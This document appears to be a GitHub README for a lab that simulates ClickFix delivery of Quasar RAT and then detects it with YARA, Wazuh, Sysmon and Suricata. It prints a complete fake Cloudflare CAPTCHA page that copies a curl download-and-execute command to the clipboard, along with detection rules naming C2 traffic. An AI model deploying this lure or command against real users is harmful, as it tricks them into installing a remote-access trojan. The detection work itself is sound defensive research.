# ClickFix Social Engineering in Action | Detect Quasar RAT with YARA Forge, Suricata and Wazuh
This project replicates a real-world malware delivery technique known as ClickFix, where a fake Cloudflare CAPTCHA page tricks users into running a malicious command via Windows Run (Win + R). The payload is a .cmd loader that downloads and executes a Quasar RAT.

---

## Credits & Original POC Reference

This project was inspired by a proof-of-concept video by **Ayush Anand** :
[Securityinbits](https://github.com/Securityinbits)


🎥 **Video Title:**  
[ClickFix Social Engineering in Action - Quasar RAT Detection with YARA Forge](https://www.youtube.com/watch?v=yll8-yqVv0w)

 **Malware Sample Hash:**  
`bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2`  
Available on: [MalwareBazaar](https://bazaar.abuse.ch/sample/bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2/)

## Objective
The goal of this simulation is to demonstrate how attackers can abuse social engineering and scripting to deliver a Remote Access Trojan (Quasar RAT) using a fake Cloudflare CAPTCHA page — known as the ClickFix technique.

This project replicates the full infection chain from initial phishing to behavior monitoring and malware detection in a virtual lab setup.

**key Goals:**

  - Demonstrate the full kill chain: from phishing delivery to post-exploitation activity using a simulated fake CAPTCHA.
  - Deliver and execute Quasar RAT through a deceptive command copied via the fake web page.
  - Monitor malware behavior using tools like System Informer, FakeNet-NG.

Detect Quasar RAT through:
  - **Custom YARA** rules (via YARA Forge).
  - **Suricata IDS** custom rule set.
  - **Wazuh + Sysmon** for endpoint detection and behavioral analytics.

  - **Forward Suricata logs** from Windows to a Logstash-enabled SIEM using Filebeat, enabling real-time alerting and dashboard integration.
  
---

## Background Theory
**What is Quasar RAT?**

Quasar RAT is a .NET-based Remote Access Trojan that supports remote desktop, keylogging, system surveillance, and file operations. It is commonly used by threat actors due to its open-source nature and flexibility.

**What is ClickFix?**

"ClickFix" is a deceptive malware delivery method where victims are lured to fake Cloudflare CAPTCHA verification pages. These pages convince the user to run a command in the Windows Run dialog, which triggers the download and execution of malware.

---

## Lab Setup
Network Settings for All VMs

**Select Adapter 1**:

  - Check Enable Network Adapter
  - Attached to: NAT
  - Adapter Type: Intel PRO/1000 MT Desktop (default is fine)
  - Cable Connected: Checked

**Select Adapter 2**:
  - Adapter 2 – Host-Only Adapter (for Internal/Lab communication)**
 - Go to: VirtualBox → Settings → Network

**Select Adapter 2**:
  - Check Enable Network Adapter
  - Attached to: Host-only Adapter
  - Name: e.g., vboxnet0 (default VirtualBox host-only network)
  - Adapter Type: Intel PRO/1000 MT Desktop
  - Cable Connected:  Checked

Repeat the same for **Windows VM**.
Repeat the same for **Ubuntu VM**.

## kali Network Config
![kali 1](https://github.com/user-attachments/assets/9af84ee0-20a4-43cd-80aa-cff6f17e8e5e)
![kali 2](https://github.com/user-attachments/assets/9943cd19-5e9e-41a5-b1e8-c357c1f30c4f)

## Windows 10 Network Config
![win 1](https://github.com/user-attachments/assets/f9596035-b02e-4e1d-8ab7-a5e244cc00b1)
![win 2](https://github.com/user-attachments/assets/7b4ee105-c5f3-4772-b54f-5f05e9905dd2)

## Ubuntu Network Config
![ub1](https://github.com/user-attachments/assets/c35a0213-e96a-46e0-a037-7cd344445929)
![ub2](https://github.com/user-attachments/assets/5426d6de-334f-498f-be89-63ac7a1d9742)


**Why this dual adapter setup?**

  - **NAT Adapter** provides internet connectivity (for tool installation, script testing, optional external C2 emulation).
  - **Host-Only Adapter** allows isolated communication between Kali (attacker server) and Windows (victim), simulating a LAN-based or phishing-based attack **without exposing the VM to your real network.**

---
## Virtual Machines (VirtualBox)
| **VM NAME**  | **Network Adapter** | **Purpose** | **Tools Used** |
|---------------|-------------|---------------|---------------|
| **Kali Linux**    | **Adapter 1: NAT**  | Internet access (for updates, apt, curl)  | Apache2, payload files, phishing page |
|                   | **Adapter 2: Host-Only**  | Private LAN with victim (Windows)  | Hosts phishing page via Apache |
| **Windows 10**    | **Adapter 1: NAT**   | Internet (optional, to simulate a real user) | For browser use and tool installation |
|                   | **Adapter 2: Host-Only** | Access phishing server (Kali VM) | FakeNet-NG, System Informer, YARA,Sysmon, Wazuh Agent | 
| **Ubuntu**        | **Adapter 1: NAT**   | Internet  | For browser use and tool installation |
|                   | **Adapter 2: Host-Only** | Monitoring  |  Wazuh Manager, Suricata   | 


---
## Tool Installation

**Kali Linux:**
```bash
sudo apt update
sudo apt install apache2 curl unzip -y
```

**Windows**
  - System Informer
  - FakeNet-NG
  - YARA (for Windows)
  - YARA Forge
  - Sysmon

 ## Quasar RAT Sample
   - Malware Hash: bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2
  - Source: MalwareBazaar 
  - File Format: .cmd loader script (ClickFix-style)

---
## Phase 1: Setup Fake Cloudflare CAPTCHA Page (In Kali Machine)

**1.Start and Enable Apache service:**
```bash
sudo systemctl start apache2
sudo systemctl enable apache2
```

**2. Create the Fake Cloudflare Phishing Directory**
Now, create a folder to host your fake ClickFix page:
```bash
sudo mkdir -p /var/www/html/clickfix
cd /var/www/html/clickfix
```

**3. Create the Fake Cloudflare HTML Page**
Create a file named index.html in that directory:
```bash
sudo nano index.html
```

Paste the following HTML code inside index.html:
```bash
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Just a moment...</title>
  <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0;
      color: #333;
      text-align: center;
      padding-top: 100px;
    }

    .cf-container {
      display: inline-block;
      background: #ffffff;
      padding: 30px 50px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 600px;
    }

    .cf-logo {
      width: 60px;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #f90;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .verify-box {
      background: #fff6e5;
      border-left: 5px solid orange;
      text-align: left;
      padding: 15px;
      margin-top: 20px;
      font-size: 14px;
    }

    textarea {
      width: 100%;
      height: 80px;
      font-size: 13px;
      margin-top: 10px;
      resize: none;
    }

    .btn {
      margin-top: 20px;
      background-color: #f90;
      color: white;
      border: none;
      padding: 10px 24px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #e68a00;
    }

  </style>
</head>
<body onload="copyPayload()">

  <div class="cf-container">
    <img src="https://www.cloudflare.com/favicon.ico" class="cf-logo" alt="Cloudflare Logo">
    <h2>Just a moment...</h2>
    <div class="spinner"></div>
    <p>pumpfun.exposed is checking your browser before accessing...</p>

    <div class="verify-box">
      <b>To verify you're not a robot, follow these steps:</b>
      <ol>
        <li>Press <b>Windows Key + R</b></li>
        <li>Paste the copied command (<b>Ctrl + V</b>)</li>
        <li>Press <b>Enter</b></li>
      </ol>
      <p><i>"I am not a robot" - reCAPTCHA Verification ID: <b>8731</b></i></p>
      <textarea id="payloadBox" readonly></textarea>
    </div>

    <button class="btn" onclick="alert('Command copied to clipboard! Now press Win + R and Ctrl + V')">VERIFY</button>
  </div>

  <script>
    function copyPayload() {
      const payload = `cmd /c start /min cmd.exe /c "curl -L http://192.168.56.109/clickfix/Quasar.cmd -o %temp%\\verification.txt.bat && call %temp%\\verification.txt.bat"`;
      document.getElementById("payloadBox").value = payload;

      const input = document.createElement("textarea");
      input.value = payload;
      document.body.appendChild(input);
      input.select();
      document.execCommand("copy");
      document.body.removeChild(input);
    }
  </script>

</body>
</html>
```
 - Save and exit the editor: Press Ctrl+O then Enter to save, then Ctrl+X to exit.
![7c4a9590-09d9-41b6-bd2a-4b71ed8ec49c](https://github.com/user-attachments/assets/26c1077b-dc20-4b94-b46b-78ad3ff1c178)



**4. Place the Payload Executable**
You need the fake RAT payload renamed as ClickFix.exe
  - I already have the Quasar RAT as Quasar, move or copy it to /var/www/html/clickfix/:
```bash
sudo cp ~/Downloads/Quasar.cmd /var/www/html/clickfix/
```


**5. Restart Apache to Load Changes**
```bash
sudo systemctl restart apache2
```
**6. Find Kali Linux Host-Only IP**
Run on Kali:
```bash
ip a
```
  - Look for your Host-only adapter (usually eth1 or enp0s8), find the IPv4 address, something like 192.168.56.X..

---

## Phase 2: Phishing Execution (In Windows Machine)

**Step 2.1: On Windows Victim**
  - Open browser → http://192.168.56.109/clickfix/

  - Copy Run command → press Win + R → paste → Enter

The command silently downloads and executes the Quasar .cmd RAT.

![run in run](https://github.com/user-attachments/assets/bc8bf52f-ad6d-4988-8fa6-3c47b68c9ca2)


---

## Phase 3: Behavior Monitoring with System Informer

  1. Download System Informer.

  2. Run System Informer as Administrator.

Watch for:

  - New processes or child processes launched by  cmd.exe, powershell.exe,temp.bat
  - Registry changes
  - Network connections
  - Clipboard access

![powershell exe running-PID=6808](https://github.com/user-attachments/assets/d21221c5-6c46-4c8d-b4b5-e3188822d390)
![execution powershell](https://github.com/user-attachments/assets/50f1632b-8ca5-4f84-a3a6-2eadaa3ef6ba)

![ratfile](https://github.com/user-attachments/assets/1ca1d18b-85cb-418c-897c-dc83408188a1)

![txt](https://github.com/user-attachments/assets/4c59e8b0-ce9b-4c83-8430-4608d2fa749c)

![3 Module loaded by powershell](https://github.com/user-attachments/assets/481e5534-7bc6-4851-8b85-2767c9db0c5b)

---
## Phase 4: Setup FakeNet-NG on Windows VM to Capture C2 Traffic
  
  1. Download and install FakeNet-NG from GitHub.
  2. Run Command Prompt as Administrator.
  - Start → Observe all traffic
  3. Observe FakeNet logs for:

  - Outgoing connections (C2 domains/IPs)
  - HTTP requests & responses
  - Telegram bot API calls

![powershell exe trying to connect this ip ](https://github.com/user-attachments/assets/5426dbdf-3a2f-4acf-b99e-0dff619d5028)

---

 ## Phase 5: Detect with YARA Forge
 
**How to download YARA for Windows:**

  - Go to: https://github.com/VirusTotal/yara/releases
  - Download yara-<version>-windows.zip
  - Extract the contents

**Use yara64.exe from the extracted folder**

**Step 5.1: Create ClickFix_CMD_Loader.yar for custom YARA Rules**

```bash
rule quasar_rat
{
    meta:
        description = "Detects ClickFix-style CMD loader for Quasar RAT"
        author = "Asaduzzaman Chowdhury Anik"
        date = "2025-06-26"

    strings:
        $s1 = "curl -L"
        $s2 = "cmd /c start"
        $s3 = "%temp%"
        $s4 = ".bat"
        $s5 = ".cmd"
        $s6 = "verification.txt.bat"

    condition:
        any of ($s*)
}

```
**Step 5.2: Scan**

```bash
yara64.exe Clickfix_CMD_loader.yar 6808
```
**NOTE** => [6808 = PID]

![Detect Quasar Rat with YARA Forge](https://github.com/user-attachments/assets/c18f5c54-17d8-4abd-9e39-f4f6a5ae6e38)


## Phase 6: Wazuh Host Monitoring

**Goal: Detect suspicious host behavior from the victim's machine.**
Steps:
- Install Wazuh Agent on Windows 10.
- Set the manager IP to Ubuntu host.
- Start Wazuh agent service.
- View alerts in Wazuh dashboard or log files.

  ![wazuh agent setup](https://github.com/user-attachments/assets/dd64a4ec-ad82-43d6-a327-7875704294f5)

---

 ## Phase 7: Sysmon Installation
 
**Install Sysmon on the Windows Machine**
**Step 1: Download Sysmon**

Visit: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
Download Sysmon64.zip, extract to C:\Sysmon.

**Step 2: Download Config File**
Ensure the XML config is a valid one such as from https://github.com/SwiftOnSecurity/sysmon-config

**Step 3: Install Sysmon**
```bash
cd C:\Sysmon
.\sysmon.exe -accepteula -i sysmonconfig.xml
```
**You should now see logs appearing in Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational.**

**On Ubuntu (Wazuh Manager)**
1: Enable Sysmon Log Collection in **ossec.conf** (on manager)
Edit /var/ossec/etc/shared/default:

```bash
 nano /var/ossec/etc/shared/default/agent.conf
```
2.Add the Following Configaration:

```bash
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```
![windows agent config](https://github.com/user-attachments/assets/245e555c-57ab-4dbd-b193-e651c71aa4a0)

3.Save and Exit:
  -Press Ctrl + O to save.
  -Press Enter to confirm.
  -Press Ctrl + X to exit.

4.check for configuration errors:
```bash
/var/ossec/bin/verify-agent-conf
```
**Note** :Each time you make a change to the agent.conf file, it is important to check for configuration errors. If any errors are reported by this check, they must be fixed before the next step

![check conf](https://github.com/user-attachments/assets/1253cf17-bce4-442b-9156-bca551377f3f)

5.Restart Wazuh Manager:
```bash
systemctl restart wazuh-manager
```

6.Confirm that the agent received the configuration:
```bash
/var/ossec/bin/agent_groups -S -i 001
```
![check conf](https://github.com/user-attachments/assets/2f9934b8-727c-4ba4-9e8b-ddb3362add28)

**001** => **Wazuh Agent Id**

****On Windows(Wazuh Agent)****

1.Add the following configuration in between the <ossec_config> tags of the Wazuh agent 'C:\Program Files (x86)\ossec-agent\ossec.conf' file:

```bash
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```
![winsis](https://github.com/user-attachments/assets/80e31c30-ebaa-4ca6-8253-2e23223e2ea3)

2.Restart the Wazuh agent via PowerShell with administrator privileges to apply the configuration change:
```bash
Restart-Service -Name wazuh
```
---

## Visualize Sysmon Logs in Wazuh

![v1](https://github.com/user-attachments/assets/0a9815c2-e6a2-44e9-b663-86ef9484b9c4)

![Wazuh Triggers Malware](https://github.com/user-attachments/assets/90a37f75-387b-414e-ae05-4e63de5d0d24)
![Detect Malware From Windows Sysmon Log](https://github.com/user-attachments/assets/f298a01a-3c33-4b00-bfe8-f40dad98e0b4)

![execution](https://github.com/user-attachments/assets/74291e2c-db00-4308-b51b-bf9d1aabc18a)

---

## Phase 7: Suricata Alert Genaration And forward log from Windows to Ubuntu SIEM

### Step 1: Install Suricata on Windows

**Prerequisite: Install Npcap in windows**
  - Download Npcap v1.82 from: https://npcap.com/#download
  - During install:
      - Check **"WinPcap API-compatible Mode"**

 1. Download Suricata for Windows: https://suricata.io/download/
 2. Complete setup and select your correct network interface
 3. Test configuration:
    
    ```bash
    cd "C:\Program Files\Suricata" suricata.exe -T -c .\suricata.yaml -v
    ```
    
### Step 2: Enable Logging in suricata.yaml (Windows)
  1.Open the suricata.yaml File
    **Navigate to:**    
    ```bash
    C:\Program Files\Suricata\
    ```
    
  2.Right-click suricata.yaml → Open with Notepad++ or Visual Studio Code (recommended for YAML indentation).

  3.Enable **eve.json** Logging
  Search for:
  
```bash
- eve-log:
```

Make sure it looks like this:

```bash
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - dns
        - http
        - tls
        - flow
```

**You can also add fileinfo, smtp, ssh, etc. if needed.**

4.Enable **fast.log** Logging
Below outputs: make sure you also have:

  ```bash
    - fast:
      enabled: yes
      filename: fast.log
      append: yes
  ```

![suri yaml](https://github.com/user-attachments/assets/b2b123e8-ecb4-46de-a0fc-80b2b23e8bd4)

5. Save the File
  - Save suricata.yaml
  - Make sure indentation is correct (YAML is indentation-sensitive)

## Test the Config
Dry-run Test (Check for YAML Errors)

```bash
.\suricata.exe -T -c "C:\Program Files\Suricata\suricata.yaml" -v
```
If it passes, proceed to run it live.

Now **Start Suricata**
Start Windows Powershel As Admin:
Then:

```bash
suricata.exe -c .\etc\suricata.yaml -i <interface-id>
```

Now Add rules for Suricata:
1. Download Full Rule Set

In Powershell:
```bash
Invoke-WebRequest -Uri https://rules.emergingthreats.net/open/suricata-7.0/emerging.rules.tar.gz -OutFile C:\rules.tar.gz
tar -xvzf C:\rules.tar.gz -C "C:\Program Files\Suricata\rules"
```
Also add a custom-rules file for **Clickfix Detections**

1.Add clickfix-custom File:
In Directory: 

```bash
C:\Program Files\Suricata\rules
```

 **Open Notepad as an Admin** .
 
2.Add the Following Rules:

```bash
 # Detect .ps1 script download via HTTP URI
alert http any any -> any any (msg:"[ClickFix] PowerShell Script Download Attempt (.ps1)"; flow:to_server, established; content:".ps1"; http_uri; nocase; classtype:trojan-activity; sid:110001; rev:2;)

# Detect suspicious PowerShell User-Agent
alert http any any -> any any (msg:"[ClickFix] Suspicious PowerShell User-Agent Detected"; flow:to_server, established; content:"PowerShell"; http_header; nocase; classtype:bad-unknown; sid:110002; rev:1;)

# Detect suspicious cmd.exe in HTTP URI
alert http any any -> any any (msg:"[ClickFix] Suspicious cmd.exe Execution via HTTP URI"; flow:to_server, established; content:"cmd.exe"; http_uri; nocase; classtype:shellcode-detect; sid:110003; rev:2;)

# Detect IEX command in HTTP body
alert http any any -> any any (msg:"[ClickFix] PowerShell IEX Command in HTTP Body"; flow:to_server, established; content:"IEX"; http_client_body; nocase; classtype:shellcode-detect; sid:110004; rev:1;)

# Detect .cmd file download via URI
alert http any any -> any any (msg:"[ClickFix] Suspicious .cmd File Download Attempt"; flow:to_server, established; content:".cmd"; http_uri; nocase; classtype:trojan-activity; sid:110005; rev:2;)

# Detect fake Cloudflare CAPTCHA in HTML response
alert http any any -> any any (msg:"[ClickFix] Fake Cloudflare CAPTCHA Detected"; flow:to_client, established; content:"cf-challenge"; content:"captcha"; nocase; classtype:trojan-activity; sid:110006; rev:2;)

# Detect curl User-Agent
alert http any any -> any any (msg:"[ClickFix] Suspicious User-Agent (curl)"; flow:to_server, established; content:"User-Agent|3A| curl"; http_header; nocase; classtype:bad-unknown; sid:110007; rev:1;)

# Detect base64 string in HTTP body (via content + pcre)
alert http any any -> any any (msg:"[ClickFix] Possible Base64 Payload in HTTP Body"; flow:to_server, established; content:"="; http_client_body; pcre:"/([A-Za-z0-9+\/]{100,}=*)/"; classtype:shellcode-detect; sid:110008; rev:2;)

# Detect PowerShell EncodedCommand in URI
alert http any any -> any any (msg:"[ClickFix] PowerShell EncodedCommand Detected"; flow:to_server, established; content:"-encodedCommand"; http_uri; nocase; classtype:shellcode-detect; sid:110009; rev:2;)

alert http any any -> any any (msg:"[ClickFix] Quasar RAT Default User-Agent"; flow:to_server, established; pcre:"/User-Agent\x3a Mozilla\/4\.0 \(compatible\; MSIE 6\.0\; Windows NT 5\.1\; SV1\)/iH"; classtype:trojan-activity; sid:110010; rev:3;)


# Detect typical Quasar C2 HTTP URI (e.g., /upload, /connect)
alert http any any -> any any (msg:"[ClickFix] Quasar RAT C2 URI - /connect"; flow:to_server, established; content:"/connect"; http_uri; nocase; classtype:trojan-activity; sid:110011; rev:1;)

alert http any any -> any any (msg:"[ClickFix] Quasar RAT C2 URI - /upload"; flow:to_server, established; content:"/upload"; http_uri; nocase; classtype:trojan-activity; sid:110012; rev:1;)

# Detect Quasar-specific headers (if any seen in PCAPs)
alert http any any -> any any (msg:"[ClickFix] Quasar RAT Custom Header (X-Session-ID)"; flow:to_server, established; content:"X-Session-ID"; http_header; nocase; classtype:trojan-activity; sid:110013; rev:1;)

# Detect use of binary application/octet-stream POST (typical Quasar file upload)
alert http any any -> any any (msg:"[ClickFix] Suspicious Binary File Upload via HTTP"; flow:to_server, established; content:"application/octet-stream"; http_header; nocase; classtype:shellcode-detect; sid:110014; rev:1;)

# Detect base64 command pattern in Windows PowerShell (e.g., a long string of A-Z0-9+/ with =)
alert http any any -> any any (msg:"[ClickFix] Potential Obfuscated Command in URI"; flow:to_server, established; content:"="; http_uri; pcre:"/([A-Za-z0-9+\/]{80,}=*)/"; classtype:bad-unknown; sid:110015; rev:1;)


#Basic TCP Connection Rule for Specific IP and Port
alert tcp any any -> 193.124.205.56 350 (msg:"[ClickFix] Quasar RAT C2 Detected - Known IP"; sid:110020; rev:1; classtype:trojan-activity;)

#Bi-Directional Rule (if you want to catch return traffic too)
alert tcp 193.124.205.56 350 <> any any (msg:"[ClickFix] Quasar RAT C2 Bi-Directional Comm Detected"; sid:110021; rev:1; classtype:trojan-activity;)

# Rule for Any Connection to That IP (any port)
alert ip any any -> 193.124.205.56 any (msg:"[ClickFix] Suspicious Connection to Known Malicious IP"; sid:110022; rev:1; classtype:trojan-activity;)

# Any TCP Connection From the Agent
alert tcp 10.0.2.16 any -> any any (msg:"[ClickFix] Outbound TCP Traffic from Agent 10.0.2.16"; sid:110030; rev:1; classtype:network-activity;)

#2. Any TCP Connection To the Agent
alert tcp any any -> 10.0.2.16 any (msg:"[ClickFix] Inbound TCP Traffic to Agent 10.0.2.16"; sid:110031; rev:1; classtype:network-activity;)

#3. Any IP Traffic To/From the Agent
alert ip any any -> 10.0.2.16 any (msg:"[ClickFix] Inbound IP Traffic to Agent"; sid:110032; rev:1; classtype:network-activity;)
alert ip 10.0.2.16 any -> any any (msg:"[ClickFix] Outbound IP Traffic from Agent"; sid:110033; rev:1; classtype:network-activity;)

#4. Only Detect When Agent Connects to C2 IP (193.124.205.56)
alert tcp 10.0.2.16 any -> 193.124.205.56 350 (msg:"[ClickFix] Agent Connecting to Known C2 Server"; sid:110034; rev:1; classtype:trojan-activity;)

#5. Detect HTTP Traffic from Agent (e.g., for Quasar or Powershell)
alert http 10.0.2.16 any -> any any (msg:"[ClickFix] HTTP Traffic from Agent 10.0.2.16"; sid:110035; rev:1; classtype:web-activity;)

```
3.Save the File

4.Then edit your Suricata config (suricata.yaml) and make sure it loads that rule file:
  **Search for default-rule-path and confirm the .rules file is listed:**
  
  ```bash
  default-rule-path: C:\Program Files\Suricata\rules
rule-files:
  - clickfix-custom.rules
  ```

![Custom rules for CLICKFIX detection](https://github.com/user-attachments/assets/c6cbbfdc-c8f7-4d29-9ba8-9e6afe84127b)

4. **Restart Suricata**
   Open CMD or PowerShell as Administrator:

   ```bash
   net stop suricata
   net start suricata
    ```

5.**Or run Suricata manually for testing:**

  ```bash
  "C:\Program Files\Suricata\suricata.exe" -c "C:\Program Files\Suricata\suricata.yaml" -i 1
  ```


**Now that Windows running Suricata with my custom clickfix.rules  the next step is to forward the logs (especially eve.json) from Windows to  Ubuntu SIEM (e.g., Wazuh or ELK). **

---

## Install Filebeat on Windows (Forwarder)

### Step 1:

1. Download Filebeat for Windows (ZIP) from: https://www.elastic.co/downloads/beats/filebeat
2. Extract it to:

     ```bash
     C:\Program Files\Filebeat
     ```
     
4. Open PowerShell as Administrator
5. Install Filebeat as a service:

     ```bash
     cd "C:\Program Files\Filebeat"
    .\install-service-filebeat.ps1
    ```

### Step 2:Configure Filebeat to Watch Suricata Logs

1. Edit the config file:
   
   ```bash
     C:\Program Files\Filebeat\filebeat.yml
    ```
   
2. Replace the default config with this setup:

  ```bash
   filebeat.inputs:
  - type: filestream
    id: suricata-logs
    enabled: true
    paths:
      - 'C:\Program Files\Suricata\log\eve.json'
    parsers:
      - ndjson:
          keys_under_root: true
          add_error_key: true

output.logstash:
  hosts: ["<YOUR_UBUNTU_IP>:5044"] // SIEM MANAGER'S IP (UBUNTU) 
   ```
**Replace <YOUR_UBUNTU_IP> with the IP of your Ubuntu SIEM machine.**

![FILEBEAT_yaml](https://github.com/user-attachments/assets/8dc09fc7-6558-41e9-870a-a6143ca7e9bd)

**Restart Filebeat on Windows**
Run In powershell:
```bash
Stop-Service filebeat
Start-Service filebeat
```
Or:

```bash
.\filebeat.exe -e -c filebeat.yml
```

---

## Logstash Installation and Configuration on Ubuntu (For Suricata + Filebeat)
### Step 1: Install Java (required for Logstash)
  Logstash requires Java 11:
  
  ```bash
  sudo apt update
  sudo apt install openjdk-11-jdk -y
  ```

Verify installation:

```bash
java -version
 ```

### Step 2: Install Logstash

1. Add Elastic APT repo and key:
   
   ```bash
   curl -fsSL https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/elastic.gpg
   echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
   sudo apt update
   ```
2. Install Logstash:
    ```bash
    sudo apt install logstash -y
     ```
    
### Step 3: Create a Logstash Config File for Suricata Logs

Create a new config file:
  ```bash
  sudo nano /etc/logstash/conf.d/suricata-windows.conf
  ```

Paste the following config:
 ```bash
input {
  beats {
    port => 5044
  }
}

filter {
  json {
    source => "message"
  }
}

output {
  elasticsearch {
    hosts => ["https://10.0.2.15:9200"]
    ssl => true
    ssl_certificate_verification => false
    index => "suricata-%{+YYYY.MM.dd}"
    user => "elastic"
    password => "123456"
  }
}

 ```
Save and exit (Ctrl+O, Enter, then Ctrl+X).

![logstash_conf](https://github.com/user-attachments/assets/14938544-772b-4627-8e97-d00068ecdabb)

### Step 4: Enable and Start Logstash

```bash
sudo systemctl enable logstash
sudo systemctl start logstash
 ```

Check Logstash status:
```bash
sudo systemctl status logstash
 ```
Check logs if needed:

```bash
sudo tail -f /var/log/logstash/logstash-plain.log
```

### Step 5: Confirm Logstash is Listening

```bash
sudo netstat -plunt | grep 5044
```

Now When RAT execute,Then Suricata triggers the alert.

![suri](https://github.com/user-attachments/assets/5a6f47ae-e0e0-4b8a-8197-58e8d95f7d45)

![4ef94988-db14-4cbd-b2b7-577b7517b231](https://github.com/user-attachments/assets/1c608e48-2e07-4460-bef2-526a91a2c44d)

![Trying to connect this ip](https://github.com/user-attachments/assets/43c9e523-aa68-4b68-999e-b9971ea8c5c1)


---

## Conclusion
This lab simulates a highly realistic phishing attack leveraging social engineering and .cmd scripting to deliver Quasar RAT. It walks through:

  - Phishing setup using Apache on Kali
  - RAT delivery through Windows Run
  - Live process and traffic monitoring with open tools
  - Memory dumping and YARA rule detection    
  - **Wazuh + Sysmon** for endpoint detection and behavioral analytics.
  - **Forward Suricata logs** from Windows to a Logstash-enabled SIEM using Filebeat, enabling real-time alerting and dashboard integration.

It reflects a real-world adversary TTP (Tactic, Technique, Procedure) and showcases layered defensive capabilities.

---

## Important Safety Notes
  - Only run malware on isolated VMs with no network bridge to your real network!
  - Use snapshots to revert VM state if needed.
  - Do not connect victim VM to internet except via NAT adapter for safety.
  - Disable shared folders or clipboard sharing between host and guest while testing.

---



> ⚠️ This project is for educational and cybersecurity research purposes only. No part of this work is intended for malicious use or unauthorized access.
Would you like me to insert this directly into your full write-up or GitHub-style README.md version?









